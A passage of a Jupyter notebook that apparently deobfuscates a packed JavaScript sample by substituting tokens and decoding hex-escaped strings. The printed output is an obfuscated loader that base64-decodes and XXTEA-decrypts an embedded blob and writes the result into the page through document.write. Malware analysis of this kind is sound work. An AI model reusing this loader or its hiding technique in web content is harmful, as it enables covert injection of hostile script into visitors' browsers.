      "zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO\n",
      "qTmtx8O4Seda4030oiqSTS6is7sI\n",
      "DapdSDguBoHvg9\n",
      "4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY\n",
      "qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg\n",
      "FgyKA8mgKvqN5hTNrOXx\n",
      "UlGk0\n",
      "RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g\n",
      "WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU\n",
      "FAD2\n",
      "DjkJa8Tls3\n",
      "LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J\n",
      "oWla84oDmdoetK4APv2JHRc0vTqk\n",
      "HWFShDHe44QG3xMzqtkDjPF7L4Ix7\n",
      "M7JgrZspyS4kc\n",
      "zeR9GNyNmEfbyK\n",
      "eval\n",
      "86eHPf9YN3\n",
      "true\n",
      "yOgaV7gTJK73IoMxaEc6pn0s\n",
      "hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO\n",
      "HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS\n"
     ]
    }
   ],
   "source": [
    "for i in range(306):\n",
    "    try:\n",
    "        if test[i]:\n",
    "            cipher = re.sub(r'\\b{}\\b'.format(str(i)),test[i],cipher)\n",
    "            print test[i]\n",
    "    except:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "var itVm_snY3=eval,AVgHbu2f=itVm_snY3('u'+'nes'+'cap'+'e'),GIEMslIELDjE='%31'+'%32'+'%33'+'%34'+'%35'+'%36'+'%37'+'%38',X3cQCMIIF='%64'+'%6f'+'%63'+'%75'+'%6d'+'%65'+'%6e%74',KeY='amFXzdlWQ/l96SCzj854x2RKmOvxs+URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu+XntEaVVyQ27nj9E9R3y3nf0/ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn/HgAGJ6WJYFL/+fgve7a+e62g5+0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE/dG9voAXeorZrnD5DajGhFD+oEAN/GlXx3vsD0bwf3lHbLW2anQJddojjhVbr+vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO/HlG2Q0h6qH4VDaIszr/1tp1ALr5sXKzYLxaH/ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq/7OSS3gt/fYcoa+MyyiqZ3ee5TbHN2GYG+3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx+Whw0VLgIjGuJH7CcSUre+NS6V+RslR2csadulegltGOKgc3I9SDHt4kWdn65cft+L+pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY+qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi/mri0hTbS4RbK4Moo18LyZjQHSgZj/m8gdyaOXgSv0QTIS6Z3T6ZC14+7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY/UHs8pJ3fp1TRSUNWam/L1UO+r4VoMb+lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA+Mwtrb+56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ+PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7+Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr+WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq+U5a9/ufSAZ9s0DCG91NKkPSIih7Yny/QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P+fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e/gZ/YK1qy1X+VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS+elAU9xX7rVuSOkz28mCGZylP/CMfBZkeNIl4oQka8g+YwYzTYchmXxY7+axTs0jn4qynjKptUQA28sJm/Pa0dlGfkquC/dxFOn8Q6376zO1qm1P5bEH9C4G1/mW/vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi/6iJLK2aWHg9JPUx0Eum1ni++fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb+VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt+Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX+nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf',ErTiUlaxlkP='%77'+'%72%69%74'+'%65',BMOYPRD4H;function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String['fromCharCode'](((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String['fr'+'omC'+'harCo'+'de'](((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break}}return out.join('')}var NtCion='%39'+'%63'+'%6b'+'%63'+'%6b'+'%63'+'%6b';var nbChar=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30\n",
      "key\n",
      ",31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);X3cQCMIIF=AVgHbu2f(X3cQCMIIF);function nbcode(str){var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out=\"\";while(i<len){do{c1=nbChar[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)break;do{c2=nbChar[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)break;out+=String.fromCharCode((c1\n",
      "780\n",
      "<<2)|((c2&0x30)>>4));do{c3=str.charCodeAt(i++)&0xff;if(c3==61)return out;c3=nbChar[c3]}while(i<len&&c3==-1);if(c3==-1)break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do{c4=str.charCodeAt(i++)&0xff;if(c4==61)return out;c4=nbChar[c4]}while(i<len&&c4==-1);if(c4==-1)break;out+=String['fro'+'mCha'+'rCode'](((c3&0x03)<<6)|c4)}return out}function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++){v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff)}if(w){return v.join('').substring(0,sl)}else{return v.join('')}}function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4){v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24}if(w){v[v.length]=len}return v}BMOYPRD4H=AVgHbu2f(GIEMslIELDjE+NtCion);function nbencode(str,key){if(str==\"\"){return\"\"}var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff}z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff}return long2str(v,true)}ErTiUlaxlkP=AVgHbu2f(ErTiUlaxlkP);t='LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J/FgyKA8mgKvqN5hTNrOXx+qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg+4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY+DapdSDguBoHvg9+UlGk0+RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g+DjkJa8Tls3+FAD2/WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU+AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE/INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys+0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r/7YK81INsk6Uz8l+IEZe8uY2TqqwEu5jykd3J55XXaJ42d+v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn+lH9qOZis6wzk8Y8QctBLsIx69FHY7B/11UG+GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma+5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO+RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId+R2aUXN899lY/Tq1bIKvOmdKRqbNpdb5cGc3d+7kxPX506IoEGeoQ2swFj/4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp+9N+3goD/bzvyk/39XgaLNhwLo9ErYLLi7fnP82Ux/BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9+RigwWVLYW/AYYJV2Ud1dvs7DYy0No+zng3hPhYID+KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG+nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK/x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB/zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF+NanzUKOF5FgAUfEjCvARRNUDM5enzjpU/0lvtF4acl+oAsrqxNA3ebBW4xx81xdOJaKvG6OW+c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb/AHr6iDjpx1z+7A87pQ+eQqB/m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ+cm+cgXfUFuX+hJJh8F2/+'+KeY+'+s6l0Z8jQJ3XXImIWJyu/4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b+HckMdGiuKNssm5kbzjtQsQEh+vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH+akDF7LEZES6W8VDwuXk/2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f/HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L/8HGJCh1idEw0Bo1W16p/oWla84oDmdoetK4APv2JHRc0vTqk+HWFShDHe44QG3xMzqtkDjPF7L4Ix7+M7JgrZspyS4kc+zeR9GNyNmEfbyK/3+qTmtx8O4Seda4030oiqSTS6is7sI+OiJWnvyvFI4AXlD01xbhjmjIRg/z9PfA6SKi1KZ8sMCgYPcX7Llw/PBI5u4uTRy/HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur+S4UVbzmZkoWK47LPfS3uyUuVEqqneI+4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO+zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO+0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6+pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5+DUuT1/u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH+ZAahwtK2U6NgKmp13YoeoilvC0vp6wF/42sQFqveZmFthRv9cRLEkx085ih8+0/oN3EVk65oyD/xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si+pKo8UF3jCi5fzTrEnDDLvMByVL7g+bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr/xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI+yOgaV7gTJK73IoMxaEc6pn0s+86eHPf9YN3/HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS/hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO/DXeQ8Ih00L+MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH';t=utf8to16(nbencode(nbcode(t),BMOYPRD4H));window[X3cQCMIIF][ErTiUlaxlkP](t)\n"
     ]
    }
   ],
   "source": [
    "print cipher"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "print cipher"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "a.reverse()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'alert'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"a\"+\"\\x6c\\x65\\x72\\x74\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'*'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'\\x2A'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "vhz2z='\\x2A'*65"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "vhz2z3=vhz2z+vhz2z4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "a = vhz2z3.split('*')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "116\n"
     ]
    }
   ],
   "source": [
    "for i in range(len(a)):\n",
    "    if a[i]=='fr':\n",
    "        print i"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "a.reverse()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "HlssUrQp1='\\x73\\x70'+'\\x6c\\x69'+'\\x74'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'split'"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HlssUrQp1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "aa = \"\\x65\"+\"\\x76\\x61\\x6c\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'eval'"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "aa"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "vhz2z4='*i*v*var**out*str**len***charCodeAt**case*y*return*if*length*z*c3*p*c4*0xff*while*sum*break*s*String*c2*e*function*char2*n*c1*c*0xffffffff*mx*nbChar*ErTiUlaxlkP*w*X3cQCMIIF*AVgHbu2f*fromCharCode*t*do*char3*BMOYPRD4H*6b*str2long*for*k*delta*0x3F*vl*join*utf8to16*KeY*NtCion*key*false*itVm_snY3*sl*q*nbencode*long2str*GIEMslIELDjE*nbcode*HgAGJ6WJYFL*fYcoa*e62g5*HlG2Q0h6qH4VDaIszr*0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE*fgve7a*1tp1ALr5sXKzYLxaH*dG9voAXeorZrnD5DajGhFD*oEAN*ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq*7OSS3gt*GlXx3vsD0bwf3lHbLW2anQJddojjhVbr*ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn*vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO*8HGJCh1idEw0Bo1W16p*xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI*mCha*fro*ZAahwtK2U6NgKmp13YoeoilvC0vp6wF*rCode*u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH*pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5*DUuT1*0x03*42sQFqveZmFthRv9cRLEkx085ih8*amFXzdlWQ*0x30*oN3EVk65oyD*URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu*l96SCzj854x2RKmOvxs*0XF*MyyiqZ3ee5TbHN2GYG*0x3C*XntEaVVyQ27nj9E9R3y3nf0*NS6V*Array*vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi*new*xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si*0x0F*mW*dxFOn8Q6376zO1qm1P5bEH9C4G1*CMfBZkeNIl4oQka8g*YwYzTYchmXxY7*axTs0jn4qynjKptUQA28sJm*Pa0dlGfkquC*pKo8UF3jCi5fzTrEnDDLvMByVL7g*de*6iJLK2aWHg9JPUx0Eum1ni*switch*fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb*VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt*Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX*charAt*0x1F*harCo*omC*fr*bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr*elAU9xX7rVuSOkz28mCGZylP*VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS*m8gdyaOXgSv0QTIS6Z3T6ZC14*mri0hTbS4RbK4Moo18LyZjQHSgZj*7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY*UHs8pJ3fp1TRSUNWam*L1UO*qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi*pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY*Whw0VLgIjGuJH7CcSUre*0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6*RslR2csadulegltGOKgc3I9SDHt4kWdn65cft*L*r4VoMb*lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA*QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P*ufSAZ9s0DCG91NKkPSIih7Yny*fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e*gZ*YK1qy1X*U5a9*WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq*Mwtrb*56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ*PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7*Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr*3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx*window*3goD*9N*4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp*7kxPX506IoEGeoQ2swFj*bzvyk*39XgaLNhwLo9ErYLLi7fnP82Ux*zng3hPhYID*AYYJV2Ud1dvs7DYy0No*RigwWVLYW*BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9*Tq1bIKvOmdKRqbNpdb5cGc3d*R2aUXN899lY*v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn*IEZe8uY2TqqwEu5jykd3J55XXaJ42d*7YK81INsk6Uz8l*0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r*lH9qOZis6wzk8Y8QctBLsIx69FHY7B*11UG*RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId*5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO*GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma*KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG*nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK*4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b*s6l0Z8jQJ3XXImIWJyu*hJJh8F2*cgXfUFuX*HckMdGiuKNssm5kbzjtQsQEh*vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH*HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L*2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f*akDF7LEZES6W8VDwuXk*cm*m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ*0lvtF4acl*NanzUKOF5FgAUfEjCvARRNUDM5enzjpU*zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF*x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB*oAsrqxNA3ebBW4xx81xdOJaKvG6OW*c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb*eQqB*7A87pQ*AHr6iDjpx1z*INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys*AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE*z9PfA6SKi1KZ8sMCgYPcX7Llw*6f*floor*Math*DXeQ8Ih00L*cap*u*nes*OiJWnvyvFI4AXlD01xbhjmjIRg*0x9E3779B9*MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH*6e*else*substring*4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO*6d*S4UVbzmZkoWK47LPfS3uyUuVEqqneI*PBI5u4uTRy*HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur*nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf*zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO*qTmtx8O4Seda4030oiqSTS6is7sI*DapdSDguBoHvg9*4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY*qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg*FgyKA8mgKvqN5hTNrOXx*UlGk0*RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g*WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU*FAD2*DjkJa8Tls3*LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J*oWla84oDmdoetK4APv2JHRc0vT